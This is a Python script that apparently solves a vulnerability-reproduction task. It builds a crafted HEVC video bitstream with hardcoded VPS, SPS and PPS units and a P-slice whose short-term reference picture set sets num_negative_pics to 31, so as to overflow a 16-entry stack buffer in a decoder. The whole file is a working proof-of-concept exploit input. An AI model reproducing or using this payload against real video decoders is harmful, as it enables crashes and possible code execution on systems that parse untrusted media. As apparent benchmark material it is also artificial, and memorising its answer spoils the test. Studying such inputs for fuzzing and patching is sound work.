import math

class BitstreamWriter:
    """
    A helper class to write bits and Exp-Golomb codes to a bit string,
    and then convert it to a byte array.
    """
    def __init__(self):
        self.bits = ""

    def write(self, value, n_bits):
        """Writes n_bits of a given integer value to the bitstream."""
        if n_bits > 0:
            self.bits += format(value, '0' + str(n_bits) + 'b')

    def write_ue(self, value):
        """Writes an unsigned Exp-Golomb coded value."""
        if value < 0:
            raise ValueError("UEG supports non-negative integers only")
        
        value_plus_1 = value + 1
        num_bits = value_plus_1.bit_length()
        num_leading_zeros = num_bits - 1
        
        self.write(0, num_leading_zeros)
        self.write(value_plus_1, num_bits)

    def get_bytes(self):
        """Finalizes the bitstream with trailing bits and returns it as bytes."""
        # Add rbsp_stop_one_bit
        self.write(1, 1)
        # Add rbsp_alignment_zero_bit until byte-aligned
        while len(self.bits) % 8 != 0:
            self.write(0, 1)

        byte_arr = bytearray()
        for i in range(0, len(self.bits), 8):
            byte = self.bits[i:i+8]
            byte_arr.append(int(byte, 2))
        return bytes(byte_arr)


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a stack buffer overflow in HEVC parsing.
        
        The vulnerability lies in the processing of the Short-Term Reference Picture
        Set (ST-RPS) in the slice header. A `memcpy` operation in the vulnerable
        code uses `num_negative_pics` (read from the bitstream) to determine the
        copy size. The destination buffer on the stack has a fixed size of 16
        (HEVC_MAX_REF_PICS).
        
        This PoC crafts a minimal HEVC bitstream with a P-slice. The slice header
        contains an ST-RPS with `num_negative_pics` set to 31, a value greater
        than 16. This causes the `memcpy` to write past the end of the stack buffer,
        triggering a stack buffer overflow.
        """
        
        # NAL unit start code
        start_code = b'\x00\x00\x00\x01'

        # Minimal hardcoded VPS (Video Parameter Set), NAL type 32
        vps = start_code + bytes.fromhex(
            "40010c01ffff016000000300b00000030000030078ac09"
        )

        # Minimal hardcoded SPS (Sequence Parameter Set), NAL type 33
        sps = start_code + bytes.fromhex(
            "420101016000000300b00000030000030078a003c0801107cb96b4932b"
        )

        # Minimal hardcoded PPS (Picture Parameter Set), NAL type 34
        pps = start_code + bytes.fromhex(
            "4401c173c048"
        )
        
        # NALU Header for P-slice (TRAIL_R), type=1, layer_id=0, temporal_id=1
        nalu_header = b'\x02\x01'

        slice_builder = BitstreamWriter()

        # --- Begin Slice Segment Header ---
        slice_builder.write(1, 1)  # first_slice_segment_in_pic_flag = 1
        slice_builder.write_ue(1)  # slice_type = P_SLICE
        slice_builder.write_ue(0)  # slice_pic_parameter_set_id = 0

        # Assuming log2_max_pic_order_cnt_lsb_minus4 from SPS is 0, so pic_order_cnt_lsb is 4 bits
        slice_builder.write(0, 4)  # slice_pic_order_cnt_lsb = 0
        
        # --- Begin Short-Term Reference Picture Set (ST-RPS) ---
        slice_builder.write(0, 1)  # short_term_ref_pic_set_sps_flag = 0 (RPS is in slice header)
        slice_builder.write(0, 1)  # inter_ref_pic_set_prediction_flag = 0
        
        # Vulnerable parameters: num_negative_pics must be > 16. We use 31.
        num_negative_pics = 31 
        num_positive_pics = 0
        
        slice_builder.write_ue(num_negative_pics)
        slice_builder.write_ue(num_positive_pics)

        # Negative pics list
        for i in range(num_negative_pics):
            slice_builder.write_ue(i)  # delta_poc_s0_minus1[i]
            slice_builder.write(1, 1)  # used_by_curr_pic_s0_flag[i] = 1
        
        # The crash occurs during or shortly after parsing the ST-RPS.
        # We can finalize the NAL unit here.
        slice_payload = slice_builder.get_bytes()
        
        slice_nalu = start_code + nalu_header + slice_payload
        
        poc = vps + sps + pps + slice_nalu
        return poc
